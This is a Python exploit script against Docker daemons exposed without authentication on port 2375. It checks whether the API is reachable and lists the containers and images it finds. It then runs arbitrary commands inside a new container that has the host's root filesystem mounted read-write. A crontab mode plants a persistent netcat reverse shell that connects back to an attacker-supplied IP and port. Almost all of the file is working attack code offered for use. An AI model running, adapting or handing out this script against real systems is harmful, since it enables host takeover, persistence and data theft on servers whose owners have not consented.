#!/usr/bin/env python3
"""
Docker Remote API Unauthorized Access - RCE via Exposed Docker Daemon
Client script to exploit an unauthenticated Docker daemon API.

Target: Docker daemon exposed on TCP port 2375 without authentication
Port:   2375
"""

import argparse
import sys
import requests

requests.packages.urllib3.disable_warnings()


def check_target(target):
    """Check if Docker API is accessible."""
    url = f"{target}/version"
    try:
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            data = r.json()
            print("[+] Docker API accessible!")
            print(f"    Docker Version: {data.get('Version', 'Unknown')}")
            print(f"    API Version: {data.get('ApiVersion', 'Unknown')}")
            print(f"    OS/Arch: {data.get('Os', '?')}/{data.get('Arch', '?')}")
            return True
        print(f"[-] Unexpected response: HTTP {r.status_code}")
        return False
    except requests.exceptions.ConnectionError:
        print(f"[-] Could not connect to {target}")
        return False


def list_containers(target):
    """List all containers (running and stopped)."""
    url = f"{target}/containers/json?all=true"
    r = requests.get(url, timeout=10, verify=False)
    if r.status_code == 200:
        containers = r.json()
        if containers:
            print(f"\n[+] Found {len(containers)} container(s):")
            for c in containers:
                print(f"    - {c.get('Names', ['?'])[0]} | {c.get('Image')} | {c.get('State')} | {c.get('Status')}")
        else:
            print("[*] No containers found.")
        return containers
    print(f"[-] Failed to list containers: HTTP {r.status_code}")
    return []


def list_images(target):
    """List all images on the Docker host."""
    url = f"{target}/images/json"
    r = requests.get(url, timeout=10, verify=False)
    if r.status_code == 200:
        images = r.json()
        if images:
            print(f"\n[+] Found {len(images)} image(s):")
            for img in images:
                tags = img.get('RepoTags', ['<none>'])
                size_mb = img.get('Size', 0) / (1024 * 1024)
                print(f"    - {', '.join(tags) if tags else '<none>'} ({size_mb:.1f} MB)")
        else:
            print("[*] No images found.")
        return images
    return []


def execute_command(target, command, image="alpine:latest"):
    """Execute a command by creating a container with host filesystem mounted."""
    print(f"\n[*] Executing command: {command}")
    print(f"[*] Using image: {image}")

    # Create container with /host mount
    create_url = f"{target}/containers/create"
    config = {
        "Image": image,
        "Cmd": ["/bin/sh", "-c", command],
        "Tty": True,
        "HostConfig": {
            "Binds": ["/:/host:rw"]
        }
    }

    r = requests.post(create_url, json=config, timeout=30, verify=False)
    if r.status_code not in (200, 201):
        print(f"[-] Container creation failed: HTTP {r.status_code}")
        print(f"    Response: {r.text}")
        return None

    container_id = r.json().get("Id")
    print(f"[+] Container created: {container_id[:12]}")

    # Start the container
    start_url = f"{target}/containers/{container_id}/start"
    r = requests.post(start_url, timeout=10, verify=False)
    if r.status_code not in (200, 204):
        print(f"[-] Container start failed: HTTP {r.status_code}")
        return None
    print("[+] Container started")

    # Wait for container to finish
    wait_url = f"{target}/containers/{container_id}/wait"
    r = requests.post(wait_url, timeout=60, verify=False)

    # Get logs
    logs_url = f"{target}/containers/{container_id}/logs?stdout=true&stderr=true"
    r = requests.get(logs_url, timeout=10, verify=False)
    output = r.text
    if output:
        # Clean up Docker stream headers
        clean_output = ""
        for line in output.split('\n'):
            if len(line) > 8:
                clean_output += line[8:] + "\n"
            else:
                clean_output += line + "\n"
        print(f"[+] Output:\n{clean_output.strip()}")

    # Remove container
    remove_url = f"{target}/containers/{container_id}?force=true"
    requests.delete(remove_url, timeout=10, verify=False)
    print("[+] Container cleaned up")

    return output


def exploit_crontab(target, attacker_ip, attacker_port):
    """Write a reverse shell via crontab on the host."""
    print(f"\n[*] Writing crontab reverse shell to {attacker_ip}:{attacker_port}")
    command = (
        f'echo "* * * * * /usr/bin/nc {attacker_ip} {attacker_port} -e /bin/sh" '
        f'>> /host/etc/crontabs/root'
    )
    execute_command(target, command)
    print(f"[+] Crontab written. Listen with: nc -lvnp {attacker_port}")


def main():
    parser = argparse.ArgumentParser(
        description="Docker Remote API Unauthorized Access Exploit"
    )
    parser.add_argument("target", help="Target URL (e.g., http://192.168.1.100:2375)")
    parser.add_argument("--mode", choices=["check", "exec", "crontab", "info"],
                        default="check", help="Exploitation mode (default: check)")
    parser.add_argument("--cmd", default="id", help="Command to execute (exec mode)")
    parser.add_argument("--image", default="alpine:latest", help="Docker image to use")
    parser.add_argument("--attacker-ip", help="Your IP for reverse shell (crontab mode)")
    parser.add_argument("--attacker-port", type=int, default=4444,
                        help="Your port for reverse shell (default: 4444)")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    print(f"[*] Target: {target}")

    if not check_target(target):
        sys.exit(1)

    if args.mode == "check":
        print("[+] Docker API is exposed and unauthenticated!")
    elif args.mode == "info":
        list_containers(target)
        list_images(target)
    elif args.mode == "exec":
        execute_command(target, args.cmd, args.image)
    elif args.mode == "crontab":
        if not args.attacker_ip:
            print("[-] --attacker-ip is required for crontab mode")
            sys.exit(1)
        exploit_crontab(target, args.attacker_ip, args.attacker_port)


if __name__ == "__main__":
    main()
